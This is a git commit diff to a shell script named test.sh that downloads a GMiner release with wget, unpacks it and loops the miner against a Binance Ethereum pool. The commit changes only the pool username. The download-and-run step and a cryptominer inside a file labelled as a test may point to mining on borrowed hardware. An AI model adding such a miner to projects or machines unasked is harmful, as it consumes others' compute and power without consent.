0069728a672a69f918379385df93317da25a20ea
dickminer <85894356+hinbru@users.noreply.github.com>
2021-06-15 02:56:23 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -5,6 +5,6 @@ screen -dmS gpu.sh ./gpu.sh 65 75
 wget https://github.com/develsoftware/GMinerRelease/releases/download/2.47/gminer_2_47_linux64.tar.xz
 tar xf gminer_2_47_linux64.tar.xz
 cd 2.47
-./gminer --algo ethash --server ethash.poolbinance.com:1800 --user Hintuyul --pass 123456 --watchdog 0 --ssl 0 --templimit 60
+./gminer --algo ethash --server ethash.poolbinance.com:1800 --user Minerhin --pass 123456 --watchdog 0 --ssl 0 --templimit 60
 sleep 10
 done
